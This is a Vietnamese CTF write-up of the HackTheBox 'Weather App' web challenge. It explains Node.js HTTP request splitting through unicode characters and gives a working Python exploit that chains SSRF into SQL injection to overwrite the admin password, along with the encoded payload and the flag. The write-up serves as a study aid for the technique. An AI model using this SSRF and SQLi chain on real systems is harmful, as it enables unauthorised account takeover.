# HACKTHEBOX - WEB: Weather App

## Overview

1. Website báo thời tiết, từ `/api/weather` nhận tham số `endpoint`, `city`, `country` rồi trả về nhiệt độ, mây mưa các thứ.

2. Challenge cho source code

## CODE REVIEW!!

`routes/index.js`:
```js
// ...........
router.get('/register', (req, res) => {
    return res.sendFile(path.resolve('views/register.html'));
});

router.post('/register', (req, res) => {

    // console.log('\n\n/register\n\n'); // debug
    if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
        return res.status(401).end();
    }

    let { username, password } = req.body;

    if (username && password) {
        return db.register(username, password)
            .then(()  => res.send(response('Successfully registered')))
            .catch(() => res.send(response('Something went wrong')));
    }

    return res.send(response('Missing parameters'));
});

router.get('/login', (req, res) => {
    return res.sendFile(path.resolve('views/login.html'));
});

router.post('/login', (req, res) => {
    let { username, password } = req.body;

    if (username && password) {
        return db.isAdmin(username, password)
            .then(admin => {
                if (admin) return res.send(fs.readFileSync('/app/flag').toString());
                return res.send(response('You are not admin'));
            })
            .catch(() => res.send(response('Something went wrong')));
    }
    
    return re.send(response('Missing parameters'));
});

router.post('/api/weather', (req, res) => {
    let { endpoint, city, country } = req.body;

    if (endpoint && city && country) {
        return WeatherHelper.getWeather(res, endpoint, city, country);
    }

    return res.send(response('Missing parameters'));
});
```



`helper/WeatherHelper.js`:
```js
const HttpHelper = require('../helpers/HttpHelper');

module.exports = {
    async getWeather(res, endpoint, city, country) {

        // *.openweathermap.org is out of scope
        let apiKey = '10a62430af617a949055a46fa6dec32f';
        let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`); 
        console.log(`\nhttp://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`); // debug

        if (weatherData.name) {
// .....................................
```

`package.json`:
```json
{
    "name": "weather-app",
    "version": "1.0.0",
    "description": "",
    "main": "index.js",
    "nodeVersion": "v8.12.0",
    "scripts": {
        "start": "node index.js"
    },
    "keywords": [],
    "authors": [
        "makelaris",
        "makelarisjr"
    ],
    "dependencies": {
        "body-parser": "^1.19.0",
        "express": "^4.17.1",
        "sqlite-async": "^1.1.1"
    }
}
```

Endpoint `/register` dính SQLi nhưng endpoint này chỉ có thể truy cập từ `locahost`, phần `http.get` có khả năng dính `HTTP Request Splitting`. Hướng khai thác khá rõ ràng, `SSRF` đến endpoint `/register` thực hiện SQLi cướp tài khoản admin rồi login để lấy flag

**Nghiên cứu**: Nodejs version `8.x` and `6.x` có khả năng dính lỗi `HTTP Request Splitting`. Thư viện `http` của nodejs cũng có khả năng chống SSRF nếu url có chứa các protocol characters và nó sẽ escape bằng cách `percent-escaped`. Tuy nhiên:

Although users of the http module will typically specify the request path as a string, Node.js must ultimately output the request as raw bytes(phải output ra raw byte tức phải convert). JavaScript has unicode strings, so converting them into bytes means selecting and applying an appropriate unicode encoding. For requests that do not include a body, Node.js defaults to using "latin1"(mặc định convert sang latin1), a single-byte encoding that cannot represent high-numbered unicode characters such as the 🐶 emoji. Such characters are instead truncated to just their lowest byte of their internal JavaScript representation

```
> 'http://example.com/\u{010D}\u{010A}/test'
http://example.com/čĊ/test
```
When Node.js version 8 or lower makes a GET request to this URL, it doesn't escape them because they're not HTTP control characters:

But when the resulting string is encoded as latin1 to write it out to the wire, these characters get truncated into the bytes for "\r" and "\n" respectively:

```
> Buffer.from('http://example.com/\u{010D}\u{010A}/test', 'latin1').toString()
'http://example.com/\r\n/test'
```
Thus, by including carefully-selected unicode characters in the request path, an attacker could trick Node.js into writing HTTP protocol control characters out to the wire. The behaviour has been fixed in the recent Node.js 10 release.

**Bug report**: https://hackerone.com/reports/409943

**Explaination**: https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/

Build python script đấm nó thôi:
```python
import requests
import urllib.parse


url = 'http://157.245.46.136:31900/'

sqli = "username={}&password={}".format(urllib.parse.quote_plus("admin', '1') ON CONFLICT(username) DO UPDATE SET password = '1';-- -"), "1")

payload = f'127.0.0.1:80/r/n/r/nPOST /register HTTP/1.1/r/nHost: 127.0.0.1/r/nContent-Type: application/x-www-form-urlencoded/r/nContent-Length: {len(sqli)}/r/n/r/n{sqli}/r/n/r/nGET /param='

payload = payload.replace('/r/n', '\u010d\u010a')
payload = payload.replace(' ', '\u0120')
print(payload)

data = {
    'endpoint': payload,
    'city': 'hanoi',
    'country': ' vietnam'
}

r = requests.post(url+'api/weather', data=data)

print(r.text)
```
Host debug tại local, khi build payload lưu ý:

1. Request đầu cần host lẫn port để thành 1 valid request.
2. Với request thứ 2, payload SQLi cần urlencode nên không thể thiếu `Content-Type`, POST method nên cần `Content-Length`.
3. Kết thúc main request cần end gói request này bằn `\r\n\rn` và đệm tiếp 1 request cuối để valid.
4. Vì SQLite không có `ON DUPLICATE KEY UPDATE <key>=<value>;` nên ta dùng `ON CONFLIC(<key>) DO UPDATE SET <key>=<value>;`.

**Duplicate SQLite**: https://stackoverflow.com/questions/2717590/sqlite-insert-on-duplicate-key-update-upsert

`encoded payload`:
```
127.0.0.1:80čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ110čĊčĊusername=admin%27%2C+%271%27%29+ON+CONFLICT%28username%29+DO+UPDATE+SET+password+%3D+%271%27%3B--+-&password=1čĊčĊGETĠ/param=
```

**flag**: `HTB{w3lc0m3_t0_th3_p1p3_dr34m}`
